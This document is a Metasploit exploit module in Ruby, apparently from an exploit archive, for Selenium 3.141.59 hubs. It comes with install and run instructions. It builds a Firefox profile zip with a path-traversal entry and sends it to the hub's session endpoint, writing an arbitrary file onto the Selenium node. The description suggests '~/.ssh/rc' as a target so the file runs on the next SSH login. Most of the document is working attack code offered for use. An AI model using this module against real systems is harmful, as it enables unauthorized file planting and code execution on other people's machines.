# Exploit Title: Selenium Node Upload
# Date: 3/7/2021
# Exploit Author: Jon Statton
# Vendor Homepage: https://www.selenium.dev/
# Software Link: https://selenium-release.storage.googleapis.com/3.141/selenium-server-standalone-3.141.59.jar
# Version: 3.141.59
# Tested on: 3.141.59 + Firefox(geckodriver)

# DESCRIPTION: This basically creates a Firefox profile that sets a new download directory and turns off the prompt to save files (based on MIME type). It then runs a selenium test with an inline html download link and clicks it to save the file. If a local file is used, then the download link will simple be the file base64 encoded. For large files, it would be best to pass in a URL link to a file rather than a local file on the file system. Currently, this is only written for Geckodriver/Firefox. But similar options seem possible for all common browsers that have a Webdriver. Some limitations are that it cannot currently overwrite files, or create dot files. One example target for a POC could be "~/.ssh/rc"; which is a file that gets executed on a new SSH login.

# INSTALL: To install copy this to "~/.msf4/modules/exploits/multi/http/" or whatever.

# RUN: Set "URL" to the HUB URL (Should look like http://selenium-hub.lan:4444/wd/hub). Set "REMOTE_FILE" to the path and name of file on the NODE (example: /tmp/blah.txt). Set "LOCAL_FILE" to a full path and name of a file on the local filesystem.

require 'net/http'
require 'json'
require 'uri'
require 'zip'
require 'base64'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Selenium Node Upload(profile)',
      'Description'    => %q{
        Use the browser(Firefox) on a Selenium Node to upload a file.
        The upload location will create any directories that do not exist. Including dotfile directories.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Jon Stratton' ],
      'References'     =>
        [
          [ 'URL', 'https://github.com/JonStratton/selenium-node-takeover-kit' ]
        ],
      'Platform'       => 'misc',
      'Targets'       => [
        [
          'Native Payload', {
            'Platform' => %w{ linux osx win unix },
            'Arch'     => ARCH_ALL
          }
        ]
      ],
      'Privileged'     => false,
      'DisclosureDate' => "Oct ?? 2020",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The Selenium Hub URL. http://selenium-hub.lan:4444/wd/hub']),
        OptString.new('REMOTE_FILE', [true, 'The remote destination of the uploaded file.']),
        OptString.new('LOCAL_FILE', [true, 'The local file to upload.']),
      ])
  end

  def exploit
    remote_file = datastore['REMOTE_FILE']
    local_file = datastore['LOCAL_FILE']

    # Read in local file
    local_file_h = File.open(local_file, "rb")
    local_file_bin = local_file_h.read
    local_file_h.close

    # Build profile zip file and put the local file in it.
    stringio = Zip::OutputStream::write_buffer do |io|
      io.put_next_entry("../../../../../../%s" % [remote_file])
      io.write(local_file_bin)
    end
    stringio.rewind
    encoded_profile = Base64.strict_encode64(stringio.sysread)

    # Create session with our new profile
    newSession = {:desiredCapabilities => {:browserName => "firefox", :firefox_profile => encoded_profile}}

    # Start session with encoded_profile and save session id for cleanup.
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session'),
      'ctype'  => 'application/json',
      'data'   => JSON.generate(newSession)
    })
    sessionId = res.get_json_document["value"]["sessionId"]

    # End session
    res = send_request_cgi({
      'method' => 'DELETE',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId)
    })
  end

end
